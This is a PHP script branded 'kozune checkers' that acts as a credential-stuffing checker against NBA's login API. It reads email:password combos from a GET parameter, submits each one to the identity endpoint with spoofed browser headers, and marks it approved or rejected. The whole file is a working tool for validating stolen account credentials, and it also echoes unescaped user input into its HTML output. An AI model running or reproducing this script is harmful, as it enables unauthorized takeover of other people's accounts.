<?php
/*
  _                                      
 | |                                                                          
 | | _____ _____   _ _ __   ___          
 | |/ / _ \_  / | | | '_ \ / _ \         
 |   < (_) / /| |_| | | | |  __/         
 |_|\_\___/___|\__,_|_|_|_|\___|         
      | |             | |                
   ___| |__   ___  ___| | _____ _ __ ___ 
  / __| '_ \ / _ \/ __| |/ / _ \ '__/ __|
 | (__| | | |  __/ (__|   <  __/ |  \__ \
  \___|_| |_|\___|\___|_|\_\___|_|  |___/
                                         
                                         
*/
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($string)
{
    $delimiters = array(
        "|",
        ";",
        ":",
        "/",
        "»",
        "«",
        ">",
        "<"
    );
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista) [0];
$senha = multiexplode($lista) [1];

$linkprincipal = "https://identity.nba.com/api/v1/auth";
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)";
$header_nba = array(
    'Accept: */*',
    'origin: https://www.nba.com',
    'referer: https://www.nba.com',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'user-agent: ' . $agent . ''

);
$result = curl_init();
curl_setopt($result, CURLOPT_URL, $linkprincipal);
curl_setopt($result, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($result, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($result, CURLOPT_POSTFIELDS, "{\"email\":\"" . $email . "\",\"password\":\"" . $senha . "\",\"rememberMe\":false}");
curl_setopt($result, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($result, CURLOPT_HTTPHEADER, $header_nba);

echo $result = curl_exec($result);

if (strpos($result, 'created'))
{
    echo "<div class='badge badge-success'>#Aprovada</div> <b class='badge badge-primary'>CONTA: $lista</b><span class='badge badge-primary'>@kozune</span></p>";
}
else
{
echo "<div class='badge badge-danger'>#REPROVADA</div> <b class='badge badge-primary'>CONTA: $lista</b> 
<span class='badge badge-light'>@kozune</span></p>";
}
?>
